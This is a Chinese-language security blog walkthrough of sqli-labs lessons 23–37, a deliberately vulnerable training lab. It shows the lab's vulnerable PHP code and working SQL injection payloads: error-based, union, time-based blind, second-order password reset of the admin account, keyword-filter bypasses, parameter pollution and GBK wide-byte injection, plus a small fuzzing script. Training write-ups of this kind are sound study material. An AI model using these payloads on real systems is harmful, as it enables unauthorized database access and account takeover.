@@ -1,0 +1,143 @@
+<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="与其哀叹，不如埋头苦干"><title>sql-labs23-37 | Mochazz's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/"></a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/tx.jpeg" width="128" height="128"></a><h1 class="ttl"><a href="/">Mochazz's blog</a></h1></div><p class="m-desc">与其哀叹，不如埋头苦干</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><span class="dot">●</span><span>友链</span><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lmxspace.com">l1nk3r</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.virzz.com">Virink</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://sec2hack.com">Wfox</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lsafe.org">离心</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.kingkk.com">kingkk</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://hpdoger.me">hpdoger</a></li></ul></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">sql-labs23-37</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2017/12/05/sql-labs23-37/">2017-12-05</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/渗透测试/">渗透测试</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h3 id="Lession23"><a href="#Lession23" class="headerlink" title="Lession23"></a>Lession23</h3><pre><code>$id=$_GET[&apos;id&apos;];
+$reg = &quot;/#/&quot;;
+$reg1 = &quot;/--/&quot;;
+$replace = &quot;&quot;;
+$id = preg_replace($reg, $replace, $id);
+$id = preg_replace($reg1, $replace, $id);
+$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
+</code></pre><p>过滤了<code>#</code>和<code>--</code>，那么我们可以闭合引号结合mysql报错来进行注入<br><a id="more"></a><br><a href="http://192.168.0.29/sqli-labs/Less-23/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.0.29/sqli-labs/Less-23/?id=-1&#39;</a> union select 1,database(),3 or ‘1’=’1<br><img src="/img/sql-labs23-37/image1.png" alt><br><a href="http://192.168.0.29/sqli-labs/Less-23/?id=-1&#39;union" target="_blank" rel="noopener">http://192.168.0.29/sqli-labs/Less-23/?id=-1&#39;union</a> select 1,(select current_user()),’3<br><img src="/img/sql-labs23-37/image2.png" alt><br><a href="http://192.168.0.29/sqli-labs/Less-23/?id=1&#39;or" target="_blank" rel="noopener">http://192.168.0.29/sqli-labs/Less-23/?id=1&#39;or</a> extractvalue(1,concat(0x7e,database())) or ‘1’=’1<br><img src="/img/sql-labs23-37/image3.png" alt></p>
+<h3 id="Lession24"><a href="#Lession24" class="headerlink" title="Lession24"></a>Lession24</h3><p>首先练习环境有问题，我们需要先改一下登录页面的文件，删掉大小为1KB的logged-in.php，留下大小为2KB的logged-in.php就可以了。<br><img src="/img/sql-labs23-37/image4.png" alt><br>这一关考察的是mysql二次注入。简单解释一下二次注入，攻击者将构造好的SQL语句写入目标数据库，然后在通过目标web应用提供的某些功能，来执行该SQL语句，从而达到增删改查数据库信息的效果。举个例子，假如一个商城提供用户注册和密码找回功能，攻击者先注册一个包含有SQL语句的用户名，然后再使用密码找回功能，修改密码，这时，数据库必定会查询该用户的基本信息(使用到用户名，而用户名又带有SQL语句)，这时就会执行攻击者构造的SQL语句了。<br>我们直接来看看这道题目，先查看最初状态下，数据库中的用户有哪些<br><img src="/img/sql-labs23-37/image5.png" alt><br>假设我们要攻击admin用户，先注册一个admin’#账号，密码为test<br><img src="/img/sql-labs23-37/image6.png" alt><br>注册成功后，再次查看数据库用户记录，发现确实多了一条admin’#的账户记录<br><img src="/img/sql-labs23-37/image7.png" alt><br>我们用账号：admin’# 密码：test登录，发现页面提供了修改密码的功能。我们试一下把密码改成hackyou<br><img src="/img/sql-labs23-37/image8.png" alt><br>神奇的一幕发生了，admin的密码被修改了，而没有去修改admin’#用户的密码。<br><img src="/img/sql-labs23-37/image9.png" alt><br>我们来看看后台代码是怎么写的就明白了</p>
+<pre><code>......
+$username= $_SESSION[&quot;username&quot;];
+$curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]);
+$pass= mysql_real_escape_string($_POST[&apos;password&apos;]);
+$re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]);
+if($pass==$re_pass)
+{   
+    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
+    ......
+}
+</code></pre><p>看到SQL语句，我们就清楚的知道发生了什么，我们用户名为admin’#，密码为hackyou，所以当我们提交修改密码的表单时，sql语句就变成了<br>UPDATE users SET PASSWORD=’hackyou’ where username=’admin’#’ and password=’test’<br>PS：(#号表示注释，所以只会执行#号之前的语句)<br>在CTF赛事中也经常会考到二次注入，具体可看：<br>(2017广东省强网杯Web全解)[<a href="http://mochazz.oschina.io/2017/09/11/QWBCTF/#第三题]" target="_blank" rel="noopener">http://mochazz.oschina.io/2017/09/11/QWBCTF/#第三题]</a></p>
+<h3 id="Lession25"><a href="#Lession25" class="headerlink" title="Lession25"></a>Lession25</h3><p>这关过滤了and和or(包括大小写)，关键代码如下</p>
+<pre><code>function blacklist($id)
+{
+    $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);
+    $id= preg_replace(&apos;/AND/i&apos;,&quot;&quot;, $id);
+    return $id;
+}
+$id= blacklist($id);
+$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
+</code></pre><p>可以使用双写关键字绕过<br><img src="/img/sql-labs23-37/image10.png" alt><br><img src="/img/sql-labs23-37/image11.png" alt><br>或者使用&amp;&amp;代替and、||代替or<br><img src="/img/sql-labs23-37/image12.png" alt><br><img src="/img/sql-labs23-37/image13.png" alt><br>本来用%00或者/**/插在被过滤的关键字中间也可以绕过，但是这里不知道什么原因不行。<br><img src="/img/sql-labs23-37/image14.png" alt><br><img src="/img/sql-labs23-37/image15.png" alt><br>我还写了一个fuzz脚本来进行模糊测试，但是一个都没成功，哈哈，这里还是贴出我的fuzz脚本</p>
+<pre><code>import requests
+for i in range(0,256):
+    url = &apos;&apos;&apos;http://192.168.0.29/sqli-labs/Less-25/?id=1&apos; o{}rder by 3--+&apos;&apos;&apos;
+    fuzz = &quot;%&quot; + str(&quot;%02x&quot; % i)
+    url = url.format(fuzz)
+    print(&quot;Test for &quot; + fuzz)
+    r = requests.get(url)
+    if &quot;Dumb&quot; in r.text:
+        print(&quot;#&quot;*50)
+        print(&quot;Congratulations! &quot; + fuzz + &quot;is OK for SQL injection.&quot;)
+        print(&quot;#&quot;*50)
+</code></pre><p><img src="/img/sql-labs23-37/image16.png" alt><br>贴一篇国外总结过WAF的文章：<br>(SQL_Injection_Bypassing_WAF)[ <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF]" target="_blank" rel="noopener">https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF]</a></p>
+<h3 id="Lession25a"><a href="#Lession25a" class="headerlink" title="Lession25a"></a>Lession25a</h3><p>这关只是把报错语句注释掉了，可以使用延时注入，延长的时间和数据库中的记录个数有关，延时注入payload如下<br><a href="http://192.168.0.29/sqli-labs/Less-25a/?id=0%20oorr%20if(length(database())=7,1,sleep(1))#" target="_blank" rel="noopener">http://192.168.0.29/sqli-labs/Less-25a/?id=0%20oorr%20if(length(database())=7,1,sleep(1))#</a><br>联合查询payload<br><a href="http://192.168.0.29/sqli-labs/Less-25a/?id=-1%20union%20select%201,database(),version()#" target="_blank" rel="noopener">http://192.168.0.29/sqli-labs/Less-25a/?id=-1%20union%20select%201,database(),version()#</a><br><img src="/img/sql-labs23-37/image17.png" alt></p>
+<h3 id="Lession26"><a href="#Lession26" class="headerlink" title="Lession26"></a>Lession26</h3><p>查看源代码可知，这一关在前面的基础上过滤了or、and、/、*、–、#、\、所有空格字符，代码入下</p>
+<pre><code>function blacklist($id)
+{
+    $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);
+    $id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);
+    $id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);
+    $id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);
+    $id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);
+    $id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);
+    $id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);
+    return $id;
+}
+</code></pre><p>可以使用以下字符代替空格</p>
+<pre><code>%09    TAB键（水平）
+%0a    新建一行
+%0b    TAB键（垂直）
+%0c    新的一页
+%0d    return功能
+%a0    空格
+</code></pre><h3 id="Lession26a"><a href="#Lession26a" class="headerlink" title="Lession26a"></a>Lession26a</h3><p>26关SQL查询语句如下，还关闭了mysql报错，使用联合查询即可。</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
+//print_r(mysql_error());
+</code></pre><h3 id="Lession27"><a href="#Lession27" class="headerlink" title="Lession27"></a>Lession27</h3><p>在之前的关卡上过滤了union和select，使用双写或者大小写绕过均可。</p>
+<pre><code>function blacklist($id)
+{
+    $id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);      //strip out /*
+    $id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --.
+    $id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);         //Strip out #.
+    $id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.
+    $id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);     //Strip out spaces.
+    $id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.
+    $id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);      //Strip out union
+    $id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);     //Strip out select
+    $id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);      //Strip out UNION
+    $id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);     //Strip out SELECT
+    $id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);      //Strip out Union
+    $id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);     //Strip out select
+    return $id;
+}
+</code></pre><h3 id="Lession28-28a"><a href="#Lession28-28a" class="headerlink" title="Lession28-28a"></a>Lession28-28a</h3><p>没什么好说的，和前面差不多。</p>
+<h3 id="Lession29-31"><a href="#Lession29-31" class="headerlink" title="Lession29-31"></a>Lession29-31</h3><p>这一部分训练的是HPP（HTTP Parameter Pollution），俗称HTTP参数污染。<br>开始看这题并没有发现index.php有WAF，后来发现原来是index.jsp用了WAF，关键代码如下。</p>
+<pre><code>&lt;%
+    String id = request.getParameter(&quot;id&quot;);
+    String qs = request.getQueryString();
+    String rex = &quot;^\\d+$&quot;;
+    Boolean match=id.matches(rex);
+    if(match == true)
+    {
+        URL sqli_labs = new URL(&quot;http://localhost/sqli-labs/Less-29/index.php?&quot;+ qs);
+        URLConnection sqli_labs_connection = sqli_labs.openConnection();
+    }
+%&gt;
+</code></pre><h3 id="Lession32-37"><a href="#Lession32-37" class="headerlink" title="Lession32-37"></a>Lession32-37</h3><p>这一部分训练的是宽字节注入，可以发现一些特殊符号被转义了。<br><img src="/img/sql-labs23-37/image18.png" alt><br>mysql在使用GBK编码的时候，会认为两个字符为一个汉字。所以我们可以使用一些字符和转义以后多出来的\符号结合成汉字，这样我们的单引号就又起作用了。<br>192.168.2.154/sqli-labs/Less-32/?id=-1%df’ union select 1,user(),version()–+<br><img src="/img/sql-labs23-37/image19.png" alt><br>源代码关键部分如下</p>
+<pre><code>function check_addslashes($string)
+{
+    $string = preg_replace(&apos;/&apos;. preg_quote(&apos;\\&apos;) .&apos;/&apos;, &quot;\\\\\\&quot;, $string);
+    $string = preg_replace(&apos;/\&apos;/i&apos;, &apos;\\\&apos;&apos;, $string);
+    $string = preg_replace(&apos;/\&quot;/&apos;, &quot;\\\&quot;&quot;, $string);
+    return $string;
+}
+$id=check_addslashes($_GET[&apos;id&apos;]);
+mysql_query(&quot;SET NAMES gbk&quot;);
+$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
+</code></pre><p>33关使用addslashes()函数实现和上面函数一样的功能。</p>
+<pre><code>$string = addslashes($string);
+</code></pre><p>34关和前两关没区别，只是请求方式改成POST<br>35直接注入，不需要单引号<br>36关换成用mysql_real_escape_string()函数来过滤</p>
+<pre><code>$string = mysql_real_escape_string($string);
+</code></pre><p>下列字符受影响：</p>
+<pre><code>\x00    \n    \r    \    &apos;    &quot;     \x1a
+</code></pre><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false。<br><a href="http://192.168.1.154/sqli-labs/Less-36/?id=1%df&#39;" target="_blank" rel="noopener">http://192.168.1.154/sqli-labs/Less-36/?id=1%df&#39;</a> order by 4–+<br><img src="/img/sql-labs23-37/image20.png" alt><br>37关换成了POST形式，用的还是mysql_real_escape_string()函数来过滤参数。<br><img src="/img/sql-labs23-37/image21.png" alt></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="https://mochazz.github.io">Mochazz</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2017/12/05/sql-labs23-37/">https://mochazz.github.io/2017/12/05/sql-labs23-37/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://mochazz.github.io">Mochazz的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/sql注入/">sql注入</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2017/12/05/sql-labs38-65/">&lt; sql-labs38-65</a><a class="next" href="/2017/12/04/08067CTF/">08067CTF-Web题解 &gt;</a></div><div id="valine-comment"><style type="text/css">.v * { color: #CECECE; }
+.v a { color: #0F9FB4; }
+.v a:hover { color: #216C73; }
+.v li { list-style: inherit; }
+.v .vwrap { border: 1px solid #223441; border-radius: 0; }
+.v .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.v .vbtn { border-radius: 0; color: #cecece; background: none; }
+.v .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.v .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.v .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.v code, .v pre,.v .vlist .vcard .vhead .vsys { background: #203240; }
+.v .vlist .vcard .vcontent.expand:before { background: linear-gradient(180deg,hsla(206,33%,19%,0),hsla(206,33%,19%,.9)); }
+.v .vlist .vcard .vcontent.expand:after { background: hsla(206,33%,19%,.9); }</style><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'cFxDjSziPHq4xGCbSpRGkND7-gzGzoHsz',
+  appKey:'YhJIRxQHzY9Aix5pSGnYxKkv',
+  placeholder:'ヾﾉ≧∀≦)o留下评论再走吧',
+  avatar:'wavatar',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2017 - 2019 <a href="/." rel="nofollow">Mochazz's blog</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>
